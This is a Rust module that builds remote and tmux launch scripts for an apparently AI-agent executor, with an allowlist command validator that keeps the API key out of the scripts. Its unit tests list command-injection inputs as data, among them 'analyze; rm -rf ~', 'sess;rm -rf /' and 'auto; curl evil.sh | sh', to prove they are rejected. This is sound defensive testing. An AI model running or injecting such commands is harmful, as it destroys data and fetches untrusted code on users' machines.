//! Pure helpers for building remote shell scripts and validating executor
//! input.
//!
//! Split out of `executor.rs` (issue #536: keep modules <=500 lines). These
//! functions are deliberately side-effect free so they can be unit-tested
//! without spawning processes — which is what lets the issue #997 security
//! contract (secret never lands in the script; malicious commands rejected)
//! be proven directly.

use crate::error::RemoteError;
use crate::shell_safe::validate_session_id;

/// Simple base64 encoder (standard alphabet, with padding).
pub(crate) fn b64_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let n = (b0 << 16) | (b1 << 8) | b2;
        result.push(ALPHABET[((n >> 18) & 0x3F) as usize] as char);
        result.push(ALPHABET[((n >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            result.push(ALPHABET[((n >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        if chunk.len() > 2 {
            result.push(ALPHABET[(n & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }
    result
}

/// Issue #997 (F2): allowlist-validate the `command` token before it is ever
/// interpolated into a remote shell script.
///
/// The token must match `^[a-z][a-z0-9-]{0,31}$`: a lowercase letter followed
/// by up to 31 lowercase-alphanumeric-or-hyphen characters (32 chars max).
/// This admits every current [`CommandMode`](crate::orchestrator) value
/// (`auto`, `ultrathink`, `analyze`, `fix`) and any hyphenated recipe name,
/// while rejecting all shell metacharacters, whitespace, and the empty string.
/// Fails closed with [`RemoteError::Validation`]; no escaping fallback.
pub(crate) fn validate_command(command: &str) -> Result<(), RemoteError> {
    let mut chars = command.chars();
    let valid = match chars.next() {
        Some(first) if first.is_ascii_lowercase() => {
            command.len() <= 32
                && chars.all(|ch| ch.is_ascii_lowercase() || ch.is_ascii_digit() || ch == '-')
        }
        _ => false,
    };
    if valid {
        Ok(())
    } else {
        Err(RemoteError::validation(format!(
            "invalid command {command:?}: must match ^[a-z][a-z0-9-]{{0,31}}$"
        )))
    }
}

/// Issue #997 (F1): build the remote setup script for
/// [`crate::executor::Executor::execute_remote_with_api_key`] without ever
/// embedding the API key. The key is transported over the child's stdin and
/// read on the remote via `IFS= read -r ANTHROPIC_API_KEY`. The non-secret
/// prompt continues to travel base64-encoded and is consumed only as the
/// `$PROMPT` variable.
pub(crate) fn build_remote_script(
    workspace: &str,
    command: &str,
    prompt: &str,
    max_turns: u32,
) -> Result<String, RemoteError> {
    validate_command(command)?;
    let encoded_prompt = b64_encode(prompt.as_bytes());
    Ok(format!(
        r#"
set -e
IFS= read -r ANTHROPIC_API_KEY
export ANTHROPIC_API_KEY
cd ~
tar xzf context.tar.gz
rm -rf {workspace}
mkdir -p {workspace}
cd {workspace}
git clone ~/repo.bundle .
rm -rf .claude && cp -r ~/.claude .
PROMPT=$(echo '{prompt}' | base64 -d)
amplihack claude --{command} --max-turns {turns} -- -p "$PROMPT"
"#,
        workspace = workspace,
        prompt = encoded_prompt,
        command = command,
        turns = max_turns,
    ))
}

/// Issue #997 (F1): build the detached-tmux launch script for
/// [`crate::executor::Executor::execute_remote_tmux`] without embedding the
/// API key. Same stdin-read contract as [`build_remote_script`]; the session
/// id is validated via [`validate_session_id`] (rejecting — not stripping —
/// anything outside the strict identifier set, issue #998) and the command is
/// allowlist-validated.
pub(crate) fn build_tmux_script(
    session_id: &str,
    command: &str,
    prompt: &str,
    max_turns: u32,
) -> Result<String, RemoteError> {
    validate_command(command)?;
    let safe_session = validate_session_id(session_id)?;
    let encoded_prompt = b64_encode(prompt.as_bytes());
    Ok(format!(
        r#"
set -e
IFS= read -r ANTHROPIC_API_KEY
export ANTHROPIC_API_KEY
PROMPT=$(echo '{prompt}' | base64 -d)
tmux new-session -d -s {session} "cd ~/workspace && amplihack claude --{command} --max-turns {turns} -- -p \"$PROMPT\""
"#,
        prompt = encoded_prompt,
        session = safe_session,
        command = command,
        turns = max_turns,
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::error::RemoteError;

    #[test]
    fn b64_encode_vectors() {
        assert_eq!(b64_encode(b""), "");
        assert_eq!(b64_encode(b"A"), "QQ==");
        assert_eq!(b64_encode(b"AB"), "QUI=");
        assert_eq!(b64_encode(b"ABC"), "QUJD");
        assert_eq!(b64_encode(b"Hello, World!"), "SGVsbG8sIFdvcmxkIQ==");
        let data: Vec<u8> = (0..=255).collect();
        assert_eq!(b64_encode(&data).len() % 4, 0);
    }

    // ---- Issue #997: F2 — command allowlist validation ----

    #[test]
    fn validate_command_accepts_known_modes() {
        for cmd in ["auto", "ultrathink", "analyze", "fix"] {
            assert!(
                validate_command(cmd).is_ok(),
                "known mode {cmd:?} must be accepted"
            );
        }
    }

    #[test]
    fn validate_command_accepts_hyphenated_and_bounds() {
        // single lowercase letter is the minimum valid token
        assert!(validate_command("a").is_ok());
        // hyphens are permitted between segments
        assert!(validate_command("a-b-c").is_ok());
        assert!(validate_command("smart-orchestrator").is_ok());
        // 32 chars total (1 leading letter + 31 tail) is the inclusive max
        let max_len = format!("a{}", "b".repeat(31));
        assert_eq!(max_len.len(), 32);
        assert!(validate_command(&max_len).is_ok());
    }

    #[test]
    fn validate_command_rejects_shell_metacharacters() {
        let malicious = [
            "analyze; rm -rf ~",
            "$(whoami)",
            "`id`",
            "a|b",
            "a&&b",
            "a>b",
            "a<b",
            "a\nb",
            "a$b",
            "a'b",
            "a\"b",
            "a\\b",
        ];
        for cmd in malicious {
            assert!(
                validate_command(cmd).is_err(),
                "malicious command {cmd:?} must be rejected"
            );
        }
    }

    #[test]
    fn validate_command_rejects_whitespace_and_empty() {
        for cmd in ["", " ", "a b", "auto ", " auto", "\t"] {
            assert!(
                validate_command(cmd).is_err(),
                "command {cmd:?} must be rejected"
            );
        }
    }

    #[test]
    fn validate_command_rejects_bad_shape() {
        // must start with a lowercase letter
        assert!(validate_command("-auto").is_err());
        assert!(validate_command("1auto").is_err());
        // uppercase not allowed
        assert!(validate_command("Auto").is_err());
        assert!(validate_command("AUTO").is_err());
        // underscore not allowed
        assert!(validate_command("a_b").is_err());
        // over the 32-char limit
        let too_long = format!("a{}", "b".repeat(32));
        assert_eq!(too_long.len(), 33);
        assert!(validate_command(&too_long).is_err());
    }

    #[test]
    fn validate_command_error_is_validation_variant() {
        let err = validate_command("evil; rm -rf /").unwrap_err();
        assert!(
            matches!(err, RemoteError::Validation(_)),
            "invalid command must fail closed with a Validation error, got {err:?}"
        );
    }

    // ---- Issue #997: F1 — secret never lands in the generated script ----

    const FAKE_KEY: &str = "sk-ant-secret-DO-NOT-LEAK-0123456789";

    #[test]
    fn build_remote_script_reads_key_from_stdin_not_argv() {
        let script = build_remote_script("~/workspace", "auto", "do the thing", 5)
            .expect("valid command must build a script");
        // The key is transported via the child's stdin and read on the remote.
        assert!(
            script.contains("read -r ANTHROPIC_API_KEY"),
            "script must read the API key from stdin: {script}"
        );
        assert!(
            script.contains("export ANTHROPIC_API_KEY"),
            "script must export the API key into the child env: {script}"
        );
    }

    #[test]
    fn build_remote_script_never_embeds_key_or_decode() {
        // The builder takes no key at all, so the secret can never appear.
        let script = build_remote_script("~/workspace", "auto", "prompt text", 3).unwrap();
        assert!(
            !script.contains(FAKE_KEY),
            "raw key must never appear in the script body"
        );
        assert!(
            !script.contains(&b64_encode(FAKE_KEY.as_bytes())),
            "base64-encoded key must never appear in the script body"
        );
        // The removed leak vector: `export ANTHROPIC_API_KEY=$(echo '...' | base64 -d)`.
        assert!(
            !script.contains("ANTHROPIC_API_KEY=$(echo"),
            "must not reconstruct the key inline from an embedded literal: {script}"
        );
    }

    #[test]
    fn build_remote_script_validates_command_before_building() {
        let err = build_remote_script("~/workspace", "auto; curl evil.sh | sh", "p", 1)
            .expect_err("malicious command must be rejected before any script is built");
        assert!(matches!(err, RemoteError::Validation(_)));
    }

    #[test]
    fn build_remote_script_interpolates_validated_command_and_prompt() {
        let script = build_remote_script("~/ws", "ultrathink", "hello prompt", 7).unwrap();
        assert!(
            script.contains("--ultrathink"),
            "validated command must be interpolated: {script}"
        );
        assert!(
            script.contains("--max-turns 7"),
            "max_turns must be interpolated: {script}"
        );
        // Prompt is non-secret and travels base64-encoded, consumed as a variable.
        assert!(
            script.contains(&b64_encode(b"hello prompt")),
            "prompt must be base64-transported: {script}"
        );
        assert!(script.contains(r#"-p "$PROMPT""#));
    }

    #[test]
    fn build_tmux_script_reads_key_from_stdin_not_argv() {
        let script = build_tmux_script("sess-1", "auto", "the prompt", 4)
            .expect("valid command must build a tmux script");
        assert!(
            script.contains("read -r ANTHROPIC_API_KEY"),
            "tmux script must read the API key from stdin: {script}"
        );
        assert!(script.contains("export ANTHROPIC_API_KEY"));
    }

    #[test]
    fn build_tmux_script_never_embeds_key_or_decode() {
        let script = build_tmux_script("sess-1", "fix", "prompt", 2).unwrap();
        assert!(!script.contains(FAKE_KEY));
        assert!(!script.contains(&b64_encode(FAKE_KEY.as_bytes())));
        assert!(
            !script.contains("ANTHROPIC_API_KEY=$(echo"),
            "tmux script must not reconstruct the key from an embedded literal: {script}"
        );
    }

    #[test]
    fn build_tmux_script_validates_command() {
        let err = build_tmux_script("sess-1", "fix`reboot`", "p", 1)
            .expect_err("malicious command must be rejected");
        assert!(matches!(err, RemoteError::Validation(_)));
    }

    #[test]
    fn build_tmux_script_rejects_unsafe_session() {
        // Issue #998: an unsafe session id is REJECTED, never silently stripped
        // into a wrong-but-valid tmux session name.
        let err = build_tmux_script("sess;rm -rf /", "analyze", "p", 9)
            .expect_err("unsafe session id must be rejected");
        assert!(matches!(err, RemoteError::Validation(_)));
    }

    #[test]
    fn build_tmux_script_interpolates_valid_session_and_command() {
        let script = build_tmux_script("sess-1.0_A", "analyze", "p", 9).unwrap();
        assert!(script.contains("-s sess-1.0_A"));
        assert!(script.contains("--analyze"));
        assert!(script.contains("--max-turns 9"));
    }
}
